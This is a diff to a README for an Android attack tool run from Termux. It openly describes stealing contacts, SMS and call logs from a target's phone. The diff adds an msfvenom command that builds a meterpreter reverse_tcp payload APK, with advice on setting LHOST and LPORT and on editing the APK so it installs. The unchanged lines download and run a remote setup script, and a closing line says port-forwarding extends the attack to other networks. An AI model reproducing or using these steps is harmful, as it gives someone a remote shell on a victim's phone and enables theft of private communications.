@@ -22,8 +22,10 @@ This tool will help you to steal contacts, sms, call logs and other thing of Tar
 ```bashapt update && upgrade
 termux-setup-storage
 pkg update && pkg upgrade -y
+apt-get install curl
+apt-get install wget
+apt-get install git
 pkg install postgresql
-pkg install openssh wget curl git -y
 wget https://raw.githubusercontent.com/loathsomeguy/metasploit/main/metasploit.sh
 chmod +x metasploit.sh
 ./metasploit.sh
@@ -37,7 +39,23 @@ And run `msfconsole`
 ```bash
 msfconsole
 ```
+## Cmd to generate payload
+`msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.29.29 LPORT=6767 R > /sdcard/payload.apk`
 
+## What will be my LHOST & LPORT?
+`LHOST: your local ip of wifi/mobile network`
+`LPORT: you can use any port`
+
+## Payload Not isntalling, Giving Parsing Error?
+`
+1. Install apk editor pro in your mobile
+2. Open Apk Editor Pro and "select an apk fiel and choose your payload"
+3. Click "FULL EDIT (Resource Re-Build)"
+4. Select Manifest in bottom right corner
+5. Now Search for SDK and change target sdk version to 22
+6. Now save and again save to rebuild the apk
+7. Go to APK Editor Pro folder and install that File
+`
 ## How it is useful?
 
 * It is used to retrieve all the messages, contacts, call-logs from the Target Mobile on the same or different Network. However you need to learn how to do port-forwarding in order to do it on different network.
